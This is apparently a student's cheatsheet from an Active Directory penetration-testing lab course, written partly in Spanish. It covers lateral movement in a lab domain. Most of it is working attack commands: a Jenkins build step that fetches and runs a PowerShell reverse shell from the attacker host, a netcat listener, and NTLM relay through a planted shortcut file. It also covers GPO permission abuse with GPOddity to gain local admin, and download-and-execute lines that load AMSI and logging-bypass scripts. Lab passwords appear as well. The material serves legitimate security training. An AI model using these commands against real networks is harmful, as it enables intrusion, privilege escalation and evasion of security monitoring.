# 🏁 Cheatsheet - Fast Commands (LATERAL MOVEMENT)

## Hunt for Local Admin access

> Use a new invishell
>
> ```
> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
> ```

#### Search

```
Find-PSRemotingLocalAdminAccess
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

#### Connect - 1

```
winrs -r:dcorp-adminsrv cmd
## After
set username
set computername
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### PowerShell Remoting

> Note: Remenber use a new invishell
>
>>

#### Connect - 2

```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
## After
$env:username
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

***

## Abuse Jenkins Instance

> Note: Remember to use Edge to open the Jenkins web console!

Generally - 172.16.3.11:8080

Password default: `builduser : builduser`&#x20;

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (32).png" alt="" width="440"><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (33).png" alt="" width="551"><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

```
powershell.exe iex (iwr http://172.16.100.53/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.53 -Port 443
```

> Double check the following:
>
> 1. Remember to host the reverse shell on a local web server on your student VM. You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized. You may like to click the up arrow on the right side of the taskbar to open the system tray and double-click on the HFS icon to open it again.
> 2. Also, make sure to add an exception or turn off the firewall on the student VM.
> 3. Check if there is any typo or extra space in the Windows Batch command that you used above in the Jenkins project.
> 4. After you build the project below, check the 'Console Output' of the Jenkins Project to know more about the error.

### Share a folder with Invoke-PowerShellTcp

Fristly, execute HFS to enable the share -->

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

After, upload the Invoke-PowerShellTcp.ps1 -->

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

> Note: There is the route to copy and paste in the command:
>
> powershell.exe iex (iwr _**http://172.16.100.113/Invoke-PowerShellTcp.ps1**_ -UseBasicParsing); ...

Once we have the payload and share run, <mark style="background-color:yellow;">remember to host turn off the Windows Firewall</mark>

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Nice! One we have visibility, weak up the netcat and execute it again-->

```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

We can now run commands on the reverse shell:

```
## whoami
$env:username
## ip
ipconfig
## computer name
$env:computername
```

***

## GPOddity - GPO Abuse

> Remember the name of this GPO "DevOps Policy" 0BF8D01C-1F62-4BDC-958C-57140B67D147[^1]

#### View it with BloodHound

<figure><img src="../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>

Recall that we enumerated a user `devopsadmin` has `WriteDACL` on DevOps Policy. Let’s try to abuse this using GPOddity.

> We can see it with blood too

<figure><img src="../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>

So... we need o get access like it user or to obtain it execute a command

### Abuse an overly permissive Group Policy to get admin access on dcorp-ci.

It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'.&#x20;

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

> Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity.

First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.

### Run Ubuntu WS

> Run the following command in Ubuntu to execute ntlmrelayx. Keep in mind the following.
>
> 1. Use <mark style="background-color:yellow;">WSLToTh3Rescue!</mark> as the sudo password.
> 2. Remember to replace the IP with your own student VM.
> 3. <mark style="background-color:yellow;">Make sure that Firewall is either turned off on the student VM or you have added exceptions.</mark>

<figure><img src="../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

> Remembder unlock the local web server hs

```
sudo ntlmrelayx.py -t ldaps://<IP_DC> -wh <IP_VM> --http-port '80,8080' -i --no-smb-server
```

> Note: I obtain DC's IP pinging it `ping DOLLARCORP.MONEYCORP.LOCAL` -> 172.16.2.1

<pre><code><strong>sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.53 --http-port '80,8080' -i --no-smb-server
</strong></code></pre>

### Create a Shortcut

On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location:

<figure><img src="../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.53' -UseDefaultCredentials"
```

<figure><img src="../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

> Save it with us username (student 453)

Name the shortcut as studentx.lnk. Copy the lnk file to 'dcopr-ci\AI'.

```
xcopy C:\AD\Tools\student453.lnk \\dcorp-ci\AI
```

<figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

> <mark style="background-color:yellow;">REMEMBER UNLOCK YOUR LOCAL FIREWALL</mark>

> Resume: We need the local admin to desactive the firewall to then, use wsl ubuntu with reay and .lnk in the share

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

WE HAVE VISIBILITY! So... now use nc to the next time it access, get us a shell -->

> Remember leave the ntmlrelay running. And execute nc in another terminal WSL

### NC LDAP Terminal

Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}:

```
nc 127.0.0.1 11000
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

```
write_gpo_dacl student453 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

#### Alternative - GPO abuse PC

Alternatively, if we do not have access to any doman users, we can add a computer object and provide it the 'write\_gpo\_dacl' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}

First, create a new computer account into the AD (using the session previous obtaining with nc/ldap)

```
add_computer std453-gpattack Secretpass@123
```

After it, set permissions at this machine

```
write_gpo_dacl std453-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

> ```
> # add_computer stdx-gpattack Secretpass@123
>
> Attempting to add a new computer with the name: stdx-gpattack$
> Inferred Domain DN: DC=dollarcorp,DC=moneycorp,DC=local
> Inferred Domain Name: dollarcorp.moneycorp.local
> New Computer DN: CN=stdx-gpattack,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local
> Adding new computer with username: stdx-gpattack$ and password: Secretpass@123 result: OK
>
> # write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
>
> Adding stdx-gpattack$ to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}
> LDAP server claims to have taken the secdescriptor. Have fun
> ```

Stop the ldap shell and ntlmrelayx using `Ctrl + C`.

Now, run the GPOddity command to create the new template.

### GPOddity commands

> 1️⃣ Descarga la GPO legítima desde **SYSVOL**\
> 2️⃣ Inserta una **Scheduled Task maliciosa**\
> 3️⃣ Cambia el atributo:
>
> ```
> gPCFileSysPath
> ```
>
> para que el dominio cargue tu GPO falsa desde tu máquina.

> Note: Use the same shell of nc ubuntu

```
cd /mnt/c/AD/Tools/GPOddity

sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student453' --password 'WHw6uAAwpk4vVR6U' --command 'net localgroup administrators student453 /add' --rogue-smbserver-ip '172.16.100.53' --rogue-smbserver-share 'std453-gp' --dc-ip '172.16.2.1' --smb-mode none
```

> Note: Change stdx-gp to std113-gp
>
> Note: Change the machine ip .113

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">Leave GPOddity running and from another Ubuntu WSL session,</mark> create and share the std<mark style="background-color:yellow;">x</mark>-gp directory:

```
rm -rf /mnt/c/AD/Tools/std453-gp
mkdir /mnt/c/AD/Tools/std453-gp
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std453-gp/
```

Great, now open a new windows shell **as administrator** to create a share (std113-gp) ad assign privileges for everyone:

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

```
net share std453-gp /delete
net share std453-gp=C:\AD\Tools\std453-gp /grant:Everyone,Full
icacls "C:\AD\Tools\std453-gp" /grant Everyone:F /T
```

> If you need delete someone share use: `net share std453-gp /delete`
>
> And remove bad folders. `Remove-Item -Recurse -Force C:\AD\Tools\std453-gp -ErrorAction SilentlyContinue`

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

> U can verify it with: `dir \localhost\std453-gp` && `dir \172.16.100.53\std453-gp`

#### Tarea Resume

```
Writable share
        │ ## devopsadmin → WriteDACL → DevOps Policy
        ▼
devopsadmin ejecuta tu .lnk
        │
        ▼
NTLM Relay → theft devopsadmin
        │
        ▼
LDAP shell
        │
        ▼
add_computer
        │
        ▼
write_gpo_dacl
        │
        ▼
GPOddity modifica GPO
        │
        ▼
Scheduled Task ejecutada
        │
        ▼
student113 → Local Admin in dcorp-ci
```

### Verify if the gPCfileSysPath

> Note: Run the following new PowerView command

```
Get-DomainGPO -Identity 'DevOps Policy'
```

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">The update for this policy is configured to be every 2 minutes in the lab</mark>. After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci:

```
winrs -r:dcorp-ci cmd /c "set computername && set username"

COMPUTERNAME=DCORP-CI
USERNAME=student453
```

***

## Identify a machine where Domain Admin session is available

> We have access to two domain users - student453 and ciadmin and administrative access to dcorpadminsrv machine. User hunting has not been fruitful as studentx. We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
>
> > * **student453** → usuario de dominio normal & local admin
> >   * **admin local en `dcorp-adminsrv`** (de ejercicios anteriores)
> > * **ciadmin** → obtenido mediante **reverse shell en `dcorp-ci` explotando Jenkins & GPOddity**

### Session Hunting

We can use `Invoke-SessionHunter.ps1` from the student VM to list sessions on all the remote machines. The script connects to Remote Registry service on remote machines that runs by default. Also, admin access is not required on the remote machines.

#### Invisi-Shell

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

#### Enumeration using Invoke-SessionHunter

```
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access

HostName       UserSession         Access
--------       -----------         ------
dcorp-appsrv   dcorp\appadmin       False
...snip...
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Sweet! There is a <mark style="background-color:red;">domain admin (svcadmin) session on dcorp-mgmt server</mark>! We do not have access to the server but that comes later.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

> We can see if this user is domain admin comparing it to BloodHound

### Bypassing Security Controls

> We obtained a **reverse shell on `dcorp-ci` as the user `ciadmin`** by abusing a Jenkins job - (the best now)
>
> OR
>
> We obtained a cmd use GPOddity&#x20;

#### Upload Bypass ScriptBlock Logging + Bypass AMSI + Execute PowerView

Firstly upload all file to download aftes at us web server

> Remember set off Firewall

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Now upload all it Into (user RCE jenkings) -OR- RemotingPS obtained GPOddity

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.53/sbloggingbypass.txt'))
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.53/Amsi-Byp.txt'))
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.53/PowerView.ps1'))
```

> It download and execute all at the same time

Now we can continue wit the enumeration like:

<pre><code>Find-DomainUserLocation

<a data-footnote-ref href="#user-content-fn-1">UserDomain      : DCORP-MGMT</a>
<a data-footnote-ref href="#user-content-fn-1">UserName        : Administrator</a>
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
...snip...
UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
...snip...
</code></pre>

Great! There is a domain admin session on dcorp-mgmt server!&#x20;

> **ahora mismo hay una sesión cargada en memoria**.

Now, we can abuse this using winrs or PowerShell Remoting!

### PowerShell Remoting

Let's <mark style="background-color:yellow;">check if</mark> we can execute commands on dcorp-mgmt server with it user (ciadmin) and if the winrm port is open

```
winrs -r:dcorp-mgmt cmd /c "set computername && set username"

COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin
```

> ciadmin → tiene acceso remoto a dcorp-mgmt
>
> ciadmin = Administrators (dcorp-mgmt) (porque para ejecutar comando debes ser local admin o pertenecer al grupo)

[^1]: 
